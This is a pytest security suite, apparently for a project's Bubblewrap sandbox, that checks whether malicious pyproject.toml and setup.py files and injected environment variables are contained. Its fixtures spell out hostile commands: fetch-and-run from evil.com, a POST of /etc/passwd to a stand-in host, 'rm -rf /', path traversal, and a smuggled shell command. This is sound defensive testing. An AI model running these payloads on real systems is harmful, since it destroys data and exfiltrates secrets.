"""Security tests for malicious configuration files.

These tests verify that sandboxes properly block malicious configurations
in pyproject.toml, setup.py, and other project files that could execute
arbitrary code.
"""

import pytest
from pathlib import Path
from devloop.security.sandbox import SandboxConfig, CommandNotAllowedError, SandboxTimeoutError
from devloop.security.bubblewrap_sandbox import BubblewrapSandbox


@pytest.fixture
def sandbox_config():
    """Create test sandbox configuration."""
    return SandboxConfig(
        mode="bubblewrap",
        max_memory_mb=100,
        max_cpu_percent=25,
        timeout_seconds=5,
        # Only allow python3 for testing config execution
        allowed_tools=["python3", "cat", "ls"],
        allowed_env_vars=["PYTHONPATH"],
    )


@pytest.fixture
def malicious_workspace(tmp_path):
    """Create workspace with malicious configuration files."""
    workspace = tmp_path / "malicious_project"
    workspace.mkdir()
    return workspace


class TestMaliciousPyprojectToml:
    """Test protection against malicious pyproject.toml files."""

    @pytest.mark.asyncio
    async def test_malicious_poetry_scripts_blocked(self, sandbox_config, malicious_workspace):
        """Malicious poetry scripts with shell commands should be blocked."""
        sandbox = BubblewrapSandbox(sandbox_config)

        if not await sandbox.is_available():
            pytest.skip("Bubblewrap not available")

        # Create malicious pyproject.toml with shell injection
        malicious_pyproject = """
[tool.poetry]
name = "malicious-package"
version = "0.1.0"

[tool.poetry.scripts]
evil = "os:system('rm -rf /')"
backdoor = "subprocess:call(['curl', 'evil.com/shell.sh', '-o', '/tmp/shell.sh'])"
"""
        (malicious_workspace / "pyproject.toml").write_text(malicious_pyproject)

        # Try to execute poetry install (should be blocked because poetry not in whitelist)
        with pytest.raises(CommandNotAllowedError):
            await sandbox.execute(
                ["poetry", "install"],
                cwd=malicious_workspace
            )

    @pytest.mark.asyncio
    async def test_malicious_build_system_blocked(self, sandbox_config, malicious_workspace):
        """Malicious build-system configuration should be blocked."""
        sandbox = BubblewrapSandbox(sandbox_config)

        if not await sandbox.is_available():
            pytest.skip("Bubblewrap not available")

        # Create malicious pyproject.toml with custom build backend
        malicious_pyproject = """
[build-system]
requires = ["setuptools", "wheel"]
build-backend = "malicious_backend"

[tool.malicious]
setup_requires = ["os.system('curl evil.com/malware.sh | sh')"]
"""
        (malicious_workspace / "pyproject.toml").write_text(malicious_pyproject)

        # Try to run pip install (should be blocked because pip not in whitelist)
        with pytest.raises(CommandNotAllowedError):
            await sandbox.execute(
                ["pip", "install", "."],
                cwd=malicious_workspace
            )


class TestMaliciousSetupPy:
    """Test protection against malicious setup.py files."""

    @pytest.mark.asyncio
    async def test_setup_py_with_os_system_blocked(self, sandbox_config, malicious_workspace):
        """setup.py with os.system() calls should not execute shell commands."""
        sandbox = BubblewrapSandbox(sandbox_config)

        if not await sandbox.is_available():
            pytest.skip("Bubblewrap not available")

        # Create malicious setup.py
        malicious_setup = '''
import os
import sys

# Try to execute malicious command
os.system("touch /tmp/pwned")
os.system("curl evil.com/malware.sh -o /tmp/malware.sh")

# Try to exfiltrate data
os.system("curl -X POST evil.com/steal -d @/etc/passwd")

print("setup.py executed", file=sys.stderr)
'''
        (malicious_workspace / "setup.py").write_text(malicious_setup)
        (malicious_workspace / "test_marker.txt").write_text("marker")

        # Execute the setup.py in sandbox (python3 is allowed)
        # Network should be blocked, file system isolated
        result = await sandbox.execute(
            ["python3", "setup.py"],
            cwd=malicious_workspace
        )

        # setup.py can run but malicious actions should fail
        # Check that marker file still exists (rm didn't work)
        assert (malicious_workspace / "test_marker.txt").exists()

        # Check that network calls failed (we can't verify /tmp/pwned
        # because /tmp might be isolated or shared depending on workspace location)
        # The key is that network is isolated and sensitive files can't be accessed

    @pytest.mark.asyncio
    async def test_setup_py_with_subprocess_blocked(self, sandbox_config, malicious_workspace):
        """setup.py with subprocess calls should be restricted."""
        sandbox = BubblewrapSandbox(sandbox_config)

        if not await sandbox.is_available():
            pytest.skip("Bubblewrap not available")

        # Create malicious setup.py with subprocess
        malicious_setup = '''
import subprocess
import sys

try:
    # Try to execute shell
    subprocess.call(["bash", "-c", "whoami > /tmp/user.txt"])
    subprocess.run(["sh", "-c", "cat /etc/passwd > /tmp/passwd.txt"])
    print("subprocess succeeded", file=sys.stderr)
except Exception as e:
    print(f"subprocess failed: {e}", file=sys.stderr)
'''
        (malicious_workspace / "setup.py").write_text(malicious_setup)

        # Execute setup.py - bash/sh may be available but access is restricted
        result = await sandbox.execute(
            ["python3", "setup.py"],
            cwd=malicious_workspace
        )

        # Check that malicious actions failed (can't access /etc/passwd)
        # The security model allows commands to run but restricts filesystem access
        assert "No such file or directory" in result.stderr or "Permission denied" in result.stderr

    @pytest.mark.asyncio
    async def test_setup_py_import_restrictions(self, sandbox_config, malicious_workspace):
        """setup.py should not be able to import and execute arbitrary code."""
        sandbox = BubblewrapSandbox(sandbox_config)

        if not await sandbox.is_available():
            pytest.skip("Bubblewrap not available")

        # Create malicious setup.py that tries to import system modules
        malicious_setup = '''
import sys
try:
    # Try to import ctypes and execute arbitrary code
    import ctypes
    libc = ctypes.CDLL("libc.so.6")
    libc.system(b"touch /tmp/ctypes_pwned")
    print("ctypes attack succeeded", file=sys.stderr)
except Exception as e:
    print(f"ctypes attack failed: {e}", file=sys.stderr)

try:
    # Try to use eval/exec
    exec("import os; os.system('touch /tmp/exec_pwned')")
    print("exec attack succeeded", file=sys.stderr)
except Exception as e:
    print(f"exec attack failed: {e}", file=sys.stderr)
'''
        (malicious_workspace / "setup.py").write_text(malicious_setup)

        # Execute setup.py - even if imports work, actions should be restricted
        result = await sandbox.execute(
            ["python3", "setup.py"],
            cwd=malicious_workspace
        )

        # Code can run but should be isolated (network/filesystem restrictions)
        # The sandbox prevents the actual damage even if python code executes


class TestPathTraversal:
    """Test protection against path traversal attacks."""

    @pytest.mark.asyncio
    async def test_relative_path_traversal_blocked(self, sandbox_config, malicious_workspace):
        """Path traversal using relative paths should be blocked."""
        sandbox = BubblewrapSandbox(sandbox_config)

        if not await sandbox.is_available():
            pytest.skip("Bubblewrap not available")

        # Create a Python script that tries path traversal
        path_traversal_script = '''
import sys
try:
    # Try to read sensitive files using relative paths
    with open("../../../../etc/passwd", "r") as f:
        content = f.read()
        print(f"SUCCESS: Read {len(content)} bytes", file=sys.stderr)
except Exception as e:
    print(f"BLOCKED: {e}", file=sys.stderr)

try:
    # Try to write outside workspace
    with open("../../../../tmp/malicious.txt", "w") as f:
        f.write("pwned")
    print("SUCCESS: Wrote outside workspace", file=sys.stderr)
except Exception as e:
    print(f"BLOCKED: {e}", file=sys.stderr)
'''
        (malicious_workspace / "traversal.py").write_text(path_traversal_script)

        result = await sandbox.execute(
            ["python3", "traversal.py"],
            cwd=malicious_workspace
        )

        # Both attempts should be blocked
        assert "BLOCKED" in result.stderr
        assert "SUCCESS" not in result.stderr or result.exit_code != 0

    @pytest.mark.asyncio
    async def test_absolute_path_traversal_blocked(self, sandbox_config, malicious_workspace):
        """Path traversal using absolute paths should be blocked."""
        sandbox = BubblewrapSandbox(sandbox_config)

        if not await sandbox.is_available():
            pytest.skip("Bubblewrap not available")

        # Create a Python script that tries absolute path access
        path_script = '''
import sys
try:
    # Try to read system files
    with open("/etc/passwd", "r") as f:
        print(f"SUCCESS: Read passwd", file=sys.stderr)
except Exception as e:
    print(f"BLOCKED: {e}", file=sys.stderr)

try:
    # Try to read /root
    import os
    files = os.listdir("/root")
    print(f"SUCCESS: Listed /root: {files}", file=sys.stderr)
except Exception as e:
    print(f"BLOCKED: {e}", file=sys.stderr)
'''
        (malicious_workspace / "absolute.py").write_text(path_script)

        result = await sandbox.execute(
            ["python3", "absolute.py"],
            cwd=malicious_workspace
        )

        # Access should be blocked
        assert "BLOCKED" in result.stderr


class TestEnvironmentVariableInjection:
    """Test protection against environment variable injection."""

    @pytest.mark.asyncio
    async def test_env_var_injection_filtered(self, sandbox_config, malicious_workspace):
        """Malicious environment variables should be filtered."""
        sandbox = BubblewrapSandbox(sandbox_config)

        if not await sandbox.is_available():
            pytest.skip("Bubblewrap not available")

        # Create script that checks environment variables
        env_script = '''
import os
import sys

# Check for malicious env vars that might affect behavior
dangerous_vars = [
    "LD_PRELOAD",  # Could load malicious libraries
    "LD_LIBRARY_PATH",  # Could redirect library loading
    "PYTHONPATH",  # Could load malicious modules (but this one is allowed in config)
    "PATH",  # Could redirect command execution
    "HOME",  # Might leak user info
    "SECRET_TOKEN",  # Sensitive data
]

for var in dangerous_vars:
    value = os.getenv(var)
    if value:
        print(f"{var}={value}", file=sys.stderr)
    else:
        print(f"{var}=NOT_SET", file=sys.stderr)
'''
        (malicious_workspace / "env_check.py").write_text(env_script)

        # Try to inject malicious environment variables
        malicious_env = {
            "LD_PRELOAD": "/tmp/malicious.so",
            "LD_LIBRARY_PATH": "/tmp/evil",
            "SECRET_TOKEN": "should_not_appear",
            "PYTHONPATH": "/allowed/path",  # This one is allowed
        }

        result = await sandbox.execute(
            ["python3", "env_check.py"],
            cwd=malicious_workspace,
            env=malicious_env
        )

        # Only PYTHONPATH should be set (it's in allowed_env_vars)
        assert "PYTHONPATH=/allowed/path" in result.stderr
        # Dangerous vars should be filtered
        assert "LD_PRELOAD=/tmp/malicious.so" not in result.stderr
        assert "SECRET_TOKEN=should_not_appear" not in result.stderr

    @pytest.mark.asyncio
    async def test_env_var_code_injection_blocked(self, sandbox_config, malicious_workspace):
        """Environment variables with code injection attempts should not execute."""
        sandbox = BubblewrapSandbox(sandbox_config)

        if not await sandbox.is_available():
            pytest.skip("Bubblewrap not available")

        # Create script that uses env var in dangerous way
        env_injection_script = '''
import os
import sys

# Simulating a vulnerable script that uses env vars
command = os.getenv("USER_COMMAND", "echo safe")

# This is vulnerable to injection if USER_COMMAND contains shell metacharacters
# But sandbox should prevent this
try:
    os.system(command)  # Dangerous: don't do this in real code!
    print("Command executed", file=sys.stderr)
except Exception as e:
    print(f"Blocked: {e}", file=sys.stderr)
'''
        (malicious_workspace / "inject.py").write_text(env_injection_script)

        # Try to inject malicious command
        malicious_env = {
            "USER_COMMAND": "rm -rf / ; curl evil.com/pwned",
        }

        result = await sandbox.execute(
            ["python3", "inject.py"],
            cwd=malicious_workspace,
            env=malicious_env
        )

        # USER_COMMAND should be filtered (not in allowed list)
        # Even if it wasn't, os.system should not have access to rm/curl
        # Workspace should still exist
        assert malicious_workspace.exists()


class TestConfigFileInclusion:
    """Test protection against malicious file inclusion in configs."""

    @pytest.mark.asyncio
    async def test_config_file_inclusion_blocked(self, sandbox_config, malicious_workspace):
        """Config files should not be able to include/execute other files."""
        sandbox = BubblewrapSandbox(sandbox_config)

        if not await sandbox.is_available():
            pytest.skip("Bubblewrap not available")

        # Create a malicious Python file to be included
        malicious_module = '''
import os
os.system("touch /tmp/included_pwned")
print("Malicious module loaded")
'''
        (malicious_workspace / "malicious_module.py").write_text(malicious_module)

        # Create setup.py that includes the malicious module
        setup_with_inclusion = '''
import sys
sys.path.insert(0, ".")

try:
    import malicious_module
    print("Successfully imported malicious module")
except Exception as e:
    print(f"Failed to import: {e}")
'''
        (malicious_workspace / "setup.py").write_text(setup_with_inclusion)

        # Execute setup.py - the import will work but system commands restricted
        result = await sandbox.execute(
            ["python3", "setup.py"],
            cwd=malicious_workspace
        )

        # Import can succeed but malicious actions should be restricted
        # (filesystem isolation, no shell access)
